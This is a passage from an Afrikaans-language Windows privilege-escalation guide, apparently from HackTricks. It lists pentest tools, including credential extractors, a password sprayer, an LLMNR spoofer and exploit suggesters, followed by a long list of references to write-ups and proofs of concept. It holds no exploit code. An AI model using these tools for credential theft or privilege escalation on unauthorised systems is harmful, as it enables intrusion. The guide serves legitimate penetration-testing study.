[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek credentials uit Credential Manager. Bespeur.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is ’n PowerShell ADIDNS/LLMNR/mDNS-spoofer en man-in-the-middle-tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese Windows-enumerasie vir privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek vir bekende privesc-kwesbaarhede (VEROUDERD; gebruik Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Plaaslike kontroles **(Admin-regte benodig)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek vir bekende privesc-kwesbaarhede (moet met VisualStudio saamgestel word) ([**vooraf saamgestel**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumereer die host om verkeerde konfigurasies te soek (meer ’n inligtingversamelingsinstrument as privesc) (moet saamgestel word) **(**[**vooraf saamgestel**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek credentials uit baie sagteware (vooraf saamgestelde exe op github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kontroleer vir verkeerde konfigurasies (vooraf saamgestelde uitvoerbare lêer op github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike verkeerde konfigurasies (exe vanaf python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool geskep op grond van hierdie plasing (dit benodig nie accesschk om behoorlik te werk nie, maar kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (plaaslike python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (plaaslike Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek saamstel met die korrekte weergawe van .NET ([sien dit](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagofferhost te sien, kan jy die volgende uitvoer:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grondbeginsels van Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Verhoging van voorregte deur swak vouertoestemmings uit te buit](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - ’n cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Werkswinkel oor plaaslike voorregte-eskalasie in Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows-aanvalle: AT is die nuwe swart (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Volledige OSCP-gids](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation-gids](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-kontrolelys](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Privilege Escalation-metodes vir pentesters op Windows](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA-makro-phishing via SMTP → hMailServer-credential-dekripsie → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string-leak + stack BOF → VirtualAlloc ROP (RCE) en kerntoken-diefstal](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Op die spoor van die Silver Fox: Kat-en-muis in kernskaduwees](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Kwesbaarheid in ’n bevoorregte lêerstelsel wat in ’n SCADA-stelsel voorkom](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Simboolskakeltoetsnutsgoed – Gebruik van CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [’n Skakel na die verlede. Misbruik van simboolskakels op Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF-poort)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Gevaarlike module-resolusie op Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-modules: laai vanaf `node_modules`-vouers](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++-kontrolelysuitdagings, opgelos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues-funksie](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Diensbinêre-kaping](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own met Microslop: Koppeling van CLDFLT- en DirectX-kern-rastoestande vir Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Een I/O Ring om hulle almal te beheer: ’n Volledige lees-/skryf-exploit-primitief op Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Misbruik van arbitrêre lêerskrapings om voorregte te eskaleer en ander nuttige truuks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs-exploitkode](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-aanvalle Deel 2: CVE-2020-1013, ’n Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Verken Credential Manager en Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos-hulpbron-gebaseerde beperkte delegering: Wanneer ’n beeldverandering tot ’n voorregte-eskalasie lei](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Onttrekking van SSH-private sleutels uit Windows 10 SSH Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Verander ondernemingsopdateringsbedieners in agterdeur-fabrieke (0_o) – Deel 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Verander ondernemingsopdateringsbedieners in agterdeur-fabrieke (0_o) – Deel 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Voorregte-eskalasie deur die skrap van Microsoft Windows Installer-vouer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Naspeur jou stappe terug na NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Advies oor voorregte-eskalasie weens gedeeldegeheue-afsetsels in Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
